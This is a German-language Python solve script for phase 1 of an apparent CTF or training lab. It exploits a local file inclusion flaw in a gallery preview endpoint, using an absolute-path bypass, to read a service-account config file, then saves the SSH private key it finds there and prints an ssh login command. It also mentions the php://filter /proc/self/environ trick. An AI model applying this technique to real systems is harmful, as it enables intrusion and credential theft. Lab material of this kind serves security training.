#!/usr/bin/env python3
"""
Phase 1 Solve-Script -- "Die Fassade der Galerie"

Nutzung:
    python3 solve.py http://TARGET

Schritte, die dieses Script automatisiert (von Hand genauso über
curl/Browser möglich -- siehe Writeup):
  1. Bestätigt, dass /api/v1/gallery/preview erreichbar ist (würde man
     normalerweise per ffuf/gobuster finden, hier direkt angesprochen).
  2. Nutzt die LFI-Lücke (absoluter Pfad bypasst die Basisverzeichnis-
     Prüfung, siehe api/v1/gallery/preview.php), um die Service-Account-
     Config außerhalb des Webroots zu lesen:
     /etc/dermont-config/service-accounts.json
  3. Extrahiert daraus den SSH-Key für `ganimard` und Fragment A
     (wird für Phase 4 benötigt) und schreibt beides auf die Platte.

Hinweis: Der "klassische" Trick über
php://filter/.../resource=/proc/self/environ funktioniert hier NICHT
zuverlässig (Apache-Worker können nach dem Drop von root->www-data ihr
eigenes /proc/self/environ aus Kernel-Sicherheitsgründen nicht mehr
lesen -- siehe Kommentar in preview.php). Das Secret liegt deshalb in
einer Config-Datei, nicht in der Umgebung.
"""
import json
import os
import sys
import urllib.parse
import urllib.request

PREVIEW_PATH = "/api/v1/gallery/preview"
CONFIG_PATH = "/etc/dermont-config/service-accounts.json"


def fetch(base_url: str, img: str) -> bytes:
    url = base_url.rstrip("/") + PREVIEW_PATH + "?" + urllib.parse.urlencode({"img": img})
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read()


def main():
    if len(sys.argv) != 2:
        print(f"Nutzung: {sys.argv[0]} http://TARGET", file=sys.stderr)
        sys.exit(1)
    base_url = sys.argv[1]

    print(f"[*] Lese {CONFIG_PATH} via LFI (absoluter Pfad bypasst Basisverzeichnis) ...")
    raw = fetch(base_url, CONFIG_PATH)
    try:
        data = json.loads(raw)
    except Exception as e:
        print(f"[!] Antwort war kein JSON: {e}", file=sys.stderr)
        print(raw[:300])
        sys.exit(1)

    key = data.get("ganimard_ssh_private_key")
    fragment_a = data.get("vault_fragment_a")
    if not key:
        print("[!] ganimard_ssh_private_key fehlt in der Config.", file=sys.stderr)
        sys.exit(1)

    with open("id_ganimard", "w") as f:
        f.write(key if key.endswith("\n") else key + "\n")
    os.chmod("id_ganimard", 0o600)
    print("[+] SSH-Key für 'ganimard' -> id_ganimard")
    print(f"[+] Weiter mit: ssh -i id_ganimard ganimard@<TARGET>")

    if fragment_a:
        with open("vault_fragment_a.txt", "w") as f:
            f.write(fragment_a.strip() + "\n")
        print(f"[+] Fragment A (für Phase 4) -> vault_fragment_a.txt: {fragment_a}")


if __name__ == "__main__":
    main()
